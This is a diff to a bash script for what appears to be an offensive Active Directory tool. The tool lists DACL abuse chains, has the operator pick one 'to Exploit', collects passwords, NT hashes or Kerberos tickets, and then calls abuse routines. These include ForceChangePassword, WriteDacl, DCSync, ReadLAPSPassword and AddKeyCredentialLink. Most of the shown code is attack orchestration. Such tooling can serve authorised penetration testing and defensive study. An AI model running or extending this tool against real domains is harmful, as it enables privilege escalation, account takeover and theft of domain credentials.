@@ -16,8 +16,8 @@ BOLD='\033[1m'
 
   echo "============================================================="
   echo "   ____  _     ____  _  __ _           ____  _      _     "
-  echo "  /  _ \/ \ /\/   _\/ |/ // \        /  __\/ \  /|/ \  /|"
-  echo "  | | \|| | |||  /  |   / | |   ____ |  \/|| |  ||| |\ ||"
+  echo "  /  _ \/ \ /\/   _\/ |/ // \         /  __\/ \  /|/ \  /|"
+  echo "  | | \|| | |||  /  |   / | |   ____  |  \/|| |  ||| |\ ||"
   echo "  | |_/|| \_/||  \__|   \ | |_/\\____\|  __/| |/\||| | \||"
   echo "  \____/\____/\____/\_|\_\\____/      \_/   \_/  \|\_/  \|"
   echo "                                                          "
@@ -381,7 +381,7 @@ colorize_label() {
         "Group") echo -e "${ORANGE}${label}${NC}" ;;
         "Domain") echo -e "${LIGHT_BLUE}${label}${NC}" ;;
         "OU") echo -e "${BLUE}${label}${NC}" ;;
-        "GPO") echo -e "${MAGENTA}${label}${NC}" ;;
+        "GPO") echo -e "${RED}${label}${NC}" ;;
         *) echo -e "${label}" ;;  # Default no color for other types
     esac
 }
@@ -628,13 +628,13 @@ process_with_progress() {
 show_color_legend() {
     echo -e "\n${BOLD}LEGEND:${NC}"
     echo -e "──────────────────────────"
-    echo -e "${GREEN}Users${NC}           "
-    echo -e "${PURPLE}Computers${NC}       "
-    echo -e "${ORANGE}Groups${NC}          "
-    echo -e "${BLUE}OUs${NC}             "
-    echo -e "${LIGHT_BLUE}Domains${NC}"
-    echo -e "${MAGENTA}GPOs${NC}         "
-    echo -e "${RED}ACL${NC}"  
+    echo -e "|${GREEN}Users${NC}           "
+    echo -e "|${PURPLE}Computers${NC}       "
+    echo -e "|${ORANGE}Groups${NC}          "
+    echo -e "|${BLUE}OUs${NC}             "
+    echo -e "|${LIGHT_BLUE}Domains${NC}"
+    echo -e "|${RED}GPOs${NC}         "
+    echo -e "|${WHITE}ACL${NC}"  
     echo -e "──────────────────────────"
 }
 
@@ -672,7 +672,7 @@ DACL=$(echo "$DACL_JSON" | jq -r '
     colored_target_kind="$(colorize_kind "$target_kind")"
     
     # Format the output line (colored names, colored kinds, red abuse type)
-    echo -e "${colored_source_label} ---${RED}${abuse_type}${NC}--> ${colored_target_label}BREAK"
+    echo -e "${colored_source_label} ---${WHITE}${abuse_type}${NC}--> ${colored_target_label}BREAK"
 done)
 
 if [[ ! -z $DACL ]]; then
@@ -738,7 +738,7 @@ if [[ -s ./OU_TARGETS_${flt_domain}.txt ]]; then
         colored_target_kind="$(colorize_kind "$target_kind")"
     
         # Format the output line (colored names, colored kinds, red abuse type)
-        echo -e "${colored_source_label} ---${RED}${abuse_type}${NC}--> ${colored_target_label}BREAK"
+        echo -e "${colored_source_label} ---${WHITE}${abuse_type}${NC}--> ${colored_target_label}BREAK"
     done)
 
     if [[ ! -z $OU ]]; then
@@ -803,7 +803,8 @@ get_unique_sources() {
 
 # Display pure membership chains first (information only)
 if [[ -s GRPS_${flt_domain}.txt ]]; then
-    echo -e "\n-------PURE MEMBERSHIP CHAINS (Information Only)----------"
+    echo -e "\n${BOLD}PURE MEMBERSHIP CHAINS (Information Only)${NC}"
+    echo "=========================================================="
     cat GRPS_${flt_domain}.txt
 fi
 
@@ -818,16 +819,17 @@ fi
 
 # Display DACL abuse chains with numbers and colors
 if [[ -s DACL_ABUSE_${flt_domain}.txt ]]; then
-    echo -e "\n---------DACL ABUSE CHAINS (Select to Exploit)----------"
+    echo -e "\n${BOLD}DACL ABUSE CHAINS (Select to Exploit)${NC}"
+    echo "=========================================================="
     for i in "${!all_chains[@]}"; do
         printf "%2d) %s\n" $((i+1)) "${all_chains[i]}"
     done
 fi
 
-# Simplified menu - select directly from the numbered chains above
+# Restore the original authentication logic
 selected_chains=()
 while true; do
-    echo -e "\nChoose DACL Chain to Exploit:"
+    echo -e "\n${YELLOW}[?] Choose DACL Chain to Exploit:${NC}"
     read -p "Select a chain number (1-${#all_chains[@]}) or 0 to exit: " choice
     
     if [[ "$choice" =~ ^[0-9]+$ ]]; then
@@ -836,7 +838,113 @@ while true; do
             selected_chains=("$selected_chain")
             echo -e "\nSelected Chain $choice:"
             echo -e "$selected_chain\n"
+            
+            # Extract the starting node for authentication
+            start_node=$(echo "$selected_chain" | awk -F' ---' '{print $1}' | sed 's/\x1B\[[0-9;]*[mGK]//g')
+            start_node_type=$(color_to_obj "$(echo "$selected_chain" | awk -F' ---' '{print $1}')")
+            
+            echo -e "[*] Starting node: $start_node ($start_node_type)"
+            
+            # Handle authentication based on starting node type
+            if [[ "$start_node_type" == "Group" ]]; then
+                while true; do
+                    read -erp "${YELLOW}[?] Input credentials for a member of $start_node (USER:PASS / USER:HASH / USER:TGT_FILE): ${NC}" credentials </dev/tty
+                    creds=$(echo $credentials | awk -F":" '{print $2}')
+                    creds_src=$(echo $credentials | awk -F":" '{print $1}')
+
+                    if [[ "$creds" =~ ^[a-fA-F0-9]{32}$ ]]; then
+                        get_ticket $DC_FQDN -u $creds_src -H $creds
+                        if [ $? -eq 0 ]; then 
+                            AUTH_USER="$creds_src"
+                            break
+                        fi
+                    elif [[ -s $creds ]]; then
+                        cp $creds "./${creds_src^^}.ccache"
+                        export KRB5CCNAME="$creds"
+                        klist
+                        AUTH_USER="$creds_src"
+                        break
+                    else
+                        get_ticket $DC_FQDN -u $creds_src -p $creds
+                        if [ $? -eq 0 ]; then 
+                            AUTH_USER="$creds_src"
+                            break
+                        fi
+                    fi
+                    
+                    echo -e "[-] Authentication failed. Please check your credentials and try again.\n"
+                done
+            else
+                # For non-group starting nodes, use the node itself
+                AUTH_USER="$start_node"
+                while true; do
+                    echo "${YELLOW}[?] Choose authentication method for $AUTH_USER:${NC}"
+                    echo "  1) Password"
+                    echo "  2) NT hash"
+                    echo "  3) Kerberos ticket file"
+                    read -erp "Select option (1-3): " auth_method </dev/tty
+                    
+                    case $auth_method in
+                        1)
+                            read -erp "${YELLOW}[?] Enter password for $AUTH_USER: ${NC}" password </dev/tty
+                            echo
+                            get_ticket "$DC_FQDN" -u "$AUTH_USER" -p "$password"
+                            if [ $? -eq 0 ]; then break; fi
+                            ;;
+                            
+                        2)
+                            while true; do
+                                read -erp "${YELLOW}[?] Enter NT hash for $AUTH_USER (32 chars): ${NC}" nt_hash </dev/tty
+                                if [[ "$nt_hash" =~ ^[a-fA-F0-9]{32}$ ]]; then
+                                    get_ticket "$DC_FQDN" -u "$AUTH_USER" -H "$nt_hash"
+                                    if [ $? -eq 0 ]; then break 2; fi
+                                    break
+                                else
+                                    echo "[-] Invalid hash format. Must be 32-character hex string."
+                                fi
+                            done
+                            ;;
+                            
+                        3)
+                            while true; do
+                                read -erp "${YELLOW}[?] Enter path to Kerberos ticket file: ${NC}" ticket_file </dev/tty
+                                if [[ ! -f "$ticket_file" ]]; then
+                                    echo "[-] File does not exist: $ticket_file"
+                                    break
+                                fi
+                                
+                                if [[ ! -s "$ticket_file" ]]; then
+                                    echo "[-] Ticket file is empty: $ticket_file"
+                                    break
+                                fi
+                                
+                                # Clean the source name for filename
+                                auth_user_clean=$(echo "$AUTH_USER" | sed -e 's/\x1b\[[0-9;]*m//g')
+                                cp "$ticket_file" "./${auth_user_clean}.ccache"
+                                cp "$ticket_file" "./${auth_user_clean,,}.ccache"
+                                
+                                export KRB5CCNAME="$ticket_file"
+                                if klist; then
+                                    break 2
+                                else
+                                    echo "[-] The provided ticket file is invalid or expired"
+                                    break
+                                fi
+                            done
+                            ;;
+                            
+                        *)
+                            echo "[-] Invalid selection. Please choose 1, 2, or 3."
+                            ;;
+                    esac
+                    
+                    echo -e "[-] Authentication failed. Please try again.\n"
+                done
+            fi
+            
+            echo -e "\n${GREEN}[+] Authentication successful for: $AUTH_USER${NC}"
             break
+            
         elif (( choice == 0 )); then
             echo "Exiting..."
             exit 0
@@ -847,128 +955,196 @@ while true; do
         echo "Please enter a valid number."
     fi
 done
-# Proceed with exploitation of the single selected chain
+
+# Now proceed with exploitation using the authenticated user
 echo -e "\nProceeding with exploitation of selected chain..."
 for chain in "${selected_chains[@]}"; do
-    # Initialize
-    prev_src=""
-    prev_abuse=""
-    prev_source_type=""
-
-    echo "$chain" | \
-    awk -F ' ---|--> ' '{
-        for (i=2; i<=NF; i+=2) {
-            abuse = $i;
-            source = $(i-1);
-            target = $(i+1);
-            printf "%s \"%s\" \"%s\"\n", abuse, source, target;
+    # Clean the chain of color codes for processing
+    clean_chain=$(echo "$chain" | sed 's/\x1B\[[0-9;]*[mGK]//g')
+    
+    # Parse the clean chain into individual steps
+    echo "$clean_chain" | \
+    awk -F' ---|--> ' '
+    {
+        # Parse each relationship in the chain
+        for (i=1; i<=NF; i+=3) {
+            if (i+2 <= NF) {
+                source = $i
+                abuse = $(i+1) 
+                target = $(i+2)
+                # Clean up any remaining whitespace
+                gsub(/^[[:space:]]+|[[:space:]]+$/, "", source)
+                gsub(/^[[:space:]]+|[[:space:]]+$/, "", abuse)
+                gsub(/^[[:space:]]+|[[:space:]]+$/, "", target)
+                
+                if (source != "" && abuse != "" && target != "") {
+                    printf "%s|%s|%s\n", abuse, source, target
+                }
+            }
         }
     }' | \
     
-    while read -r cmd; do
-        source=$(echo "$cmd" | awk -F'"' '{print $2}')
-        source_type=$(color_to_obj "$source")
-        type=$(color_to_obj "$(echo "$cmd" | awk -F'"' '{print $4}')")
-        abuse=$(echo "$cmd" | awk '{print $1}' | sed 's/\x1B\[[0-9;]*[mGK]//g')
-
-        if [[ "$prev_abuse" == "MemberOf" && "$prev_source_type" == "User" ]]; then
-            SRC="$prev_src"
-        elif [[ "$source_type" == "Group" && "$prev_abuse" != "MemberOf" ]]; then
-            while true; do
-                # Ask for username for group member
-                read -erp $'[?] Enter username for a member of '"${source}"$'\e[0m: ' username </dev/tty
-                if [[ "$username" == *\$ ]]; then
-                    SRC=$(echo "${username%\$}" | tr '[:lower:]' '[:upper:]')"\$"
-                else
-                    SRC=$(echo "$username" | tr '[:lower:]' '[:upper:]')
-                fi
-                
-                # Authentication menu
-                echo "[?] Choose authentication method for $SRC:"
-                echo "  1) Password"
-                echo "  2) NT hash"
-                echo "  3) Kerberos ticket file"
-                read -erp "Select option (1-3): " auth_method </dev/tty
-                
-                case $auth_method in
-                    1)
-                        read -erp "[?] Enter password for $SRC: " password </dev/tty
-                        echo
-                        get_ticket "$DC_FQDN" -u "$SRC" -p "$password"
-                        [ $? -eq 0 ] && break
-                        ;;
-                    2)
-                        while true; do
-                            read -erp "[?] Enter NT hash for $SRC (32 chars): " nt_hash </dev/tty
-                            if [[ "$nt_hash" =~ ^[a-fA-F0-9]{32}$ ]]; then
-                                get_ticket "$DC_FQDN" -u "$SRC" -H "$nt_hash"
-                                [ $? -eq 0 ] && break 2
-                                break
-                            else
-                                echo "[-] Invalid hash format. Must be 32-character hex string."
-                            fi
-                        done
-                        ;;
-                    3)
-                        while true; do
-                            read -erp "[?] Enter path to Kerberos ticket file: " ticket_file </dev/tty
-                            if [[ -f "$ticket_file" && -s "$ticket_file" ]]; then
-                                cp "$ticket_file" "./${SRC}.ccache"
-                                export KRB5CCNAME="./${SRC}.ccache"
-                                klist && break 2 || echo "[-] Invalid/expired ticket file"; break
-                            else
-                                echo "[-] Invalid ticket file"
-                                break
-                            fi
-                        done
-                        ;;
-                    *)
-                        echo "[-] Invalid selection. Please choose 1, 2, or 3."
-                        ;;
-                esac
-                echo -e "[-] Authentication failed. Please try again.\n"
-            done
+    while IFS="|" read -r abuse source target; do
+        # Clean up any extra whitespace
+        abuse=$(echo "$abuse" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
+        source=$(echo "$source" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
+        target=$(echo "$target" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
+        
+        # Simple object type detection based on naming conventions
+        if [[ "$source" == *\$ ]]; then
+            source_obj_type="Computer"
+        elif [[ "$source" =~ ^[A-Z][A-Z0-9 ]*[A-Z0-9]$ && "$source" != *"@"* ]]; then
+            source_obj_type="Group" 
+        elif [[ "$source" == *"@"* ]]; then
+            source_obj_type="User"
+        elif [[ "$source" == *"."* && "$source" != *"@"* ]]; then
+            source_obj_type="Domain"
         else
-            SRC="$source"
+            source_obj_type="User"
+        fi
+        
+        if [[ "$target" == *\$ ]]; then
+            target_obj_type="Computer"
+        elif [[ "$target" =~ ^[A-Z][A-Z0-9 ]*[A-Z0-9]$ && "$target" != *"@"* ]]; then
+            target_obj_type="Group"
+        elif [[ "$target" == *"@"* ]]; then
+            target_obj_type="User"
+        elif [[ "$target" == *"."* && "$target" != *"@"* ]]; then
+            target_obj_type="Domain"
+        else
+            target_obj_type="User"
         fi
 
-        # Store current values for next iteration
-        prev_abuse="$abuse"
-        prev_src="$SRC"
-        prev_source_type="$source_type"
+        echo -e "\n${YELLOW}[*] Processing: $source ($source_obj_type) ---$abuse--> $target ($target_obj_type)${NC}"
 
-        # Execute the command
-        echo "$abuse $DC_FQDN \"$(echo "$SRC" | sed 's/\x1B\[[0-9;]*[mGK]//g')\" \"$(echo "$cmd" | awk -F"\"" '{print $4}' | sed 's/\x1B\[[0-9;]*[mGK]//g')\" $type" | sed 's/\x1B\[[0-9;]*[mGK]//g' | \
-        while read -r exec_cmd; do
-            # Execute the command and capture the exit status
-            eval "$exec_cmd"
-            exit_status=$?
+        # Skip MemberOf relationships (they're just for pathing)
+        if [[ "$abuse" == "MemberOf" ]]; then
+            echo -e "${GREEN}[+] MemberOf relationship - continuing chain${NC}"
+            continue
+        fi
 
-            # Check if the command failed (non-zero exit status)
-            if [ $exit_status -ne 0 ]; then
-                echo -e "\n${RED}[!] $abuse failed${NC}" >/dev/tty
+        # Use the authenticated user for exploitation
+        SRC="$AUTH_USER"
 
-                # Prompt user for action
-                while true; do
-                    read -p "[?] Do you want to (S)kip or (R)etry? [S/R]: " choice </dev/tty
-                    case "$choice" in
-                        [Ss]* ) 
-                            echo -e "[~] Skipping to next command..." >/dev/tty
-                            break  # Exit the retry loop, proceed to next command
-                            ;;
-                        [Rr]* ) 
-                            echo -e "[~] Retrying..." >/dev/tty
-                            if eval "$exec_cmd"; then  # This automatically checks for exit status 0
-                                break  # Success, proceed to next command
-                            fi
-                            ;;
-                        * ) 
-                            echo -e "[!] Invalid choice. Please enter S (Skip) or R (Retry)." >/dev/tty
-                            ;;
-                    esac
-                done
-            fi
-        done
+        # Execute the exploitation command
+        case "$abuse" in
+            "GenericAll")
+                GenericAll "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                exit_status=$?
+                ;;
+            "GenericWrite")
+                GenericWrite "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                exit_status=$?
+                ;;
+            "WriteOwner")
+                WriteOwner "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                exit_status=$?
+                ;;
+            "WriteDacl")
+                WriteDACL "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                exit_status=$?
+                ;;
+            "ForceChangePassword")
+                ForceChangePassword "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                exit_status=$?
+                ;;
+            "AllExtendedRights")
+                AllExtendedRights "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                exit_status=$?
+                ;;
+            "AddMember")
+                AddMember "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                exit_status=$?
+                ;;
+            "AddSelf")
+                AddSelf "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                exit_status=$?
+                ;;
+            "DCSync")
+                DCSync "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                exit_status=$?
+                ;;
+            "WriteSPN")
+                WriteSPN "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                exit_status=$?
+                ;;
+            "AddKeyCredentialLink")
+                AddKeyCredentialLink "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                exit_status=$?
+                ;;
+            "ReadLAPSPassword")
+                ReadLAPSPassword "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                exit_status=$?
+                ;;
+            "ReadGMSAPassword")
+                ReadGMSAPassword "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                exit_status=$?
+                ;;
+            "WriteGPLink")
+                WriteGPLink "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                exit_status=$?
+                ;;
+            "AllowedToDelegate")
+                AllowedToDelegate "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                exit_status=$?
+                ;;
+            *)
+                echo -e "${RED}[!] Unknown or unsupported abuse type: $abuse${NC}" >/dev/tty
+                exit_status=1
+                ;;
+        esac
+
+        # Check if the command failed (non-zero exit status)
+        if [ $exit_status -ne 0 ]; then
+            echo -e "\n${RED}[!] $abuse failed${NC}" >/dev/tty
+
+            # Prompt user for action
+            while true; do
+                read -p "[?] Do you want to (S)kip or (R)etry? [S/R]: " choice </dev/tty
+                case "$choice" in
+                    [Ss]* ) 
+                        echo -e "[~] Skipping to next command..." >/dev/tty
+                        break
+                        ;;
+                    [Rr]* ) 
+                        echo -e "[~] Retrying..." >/dev/tty
+                        # Retry the same command
+                        case "$abuse" in
+                            "GenericAll")
+                                GenericAll "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                                exit_status=$?
+                                ;;
+                            "GenericWrite")
+                                GenericWrite "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                                exit_status=$?
+                                ;;
+                            "WriteOwner")
+                                WriteOwner "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                                exit_status=$?
+                                ;;
+                            "WriteDacl")
+                                WriteDACL "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                                exit_status=$?
+                                ;;
+                            "ForceChangePassword")
+                                ForceChangePassword "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
+                                exit_status=$?
+                                ;;
+                            *)
+                                echo -e "${RED}[!] Cannot retry abuse type: $abuse${NC}" >/dev/tty
+                                exit_status=1
+                                ;;
+                        esac
+                        if [ $exit_status -eq 0 ]; then
+                            break
+                        fi
+                        ;;
+                    * ) 
+                        echo -e "[!] Invalid choice. Please enter S (Skip) or R (Retry)." >/dev/tty
+                        ;;
+                esac
+            done
+        fi
     done
 done
 
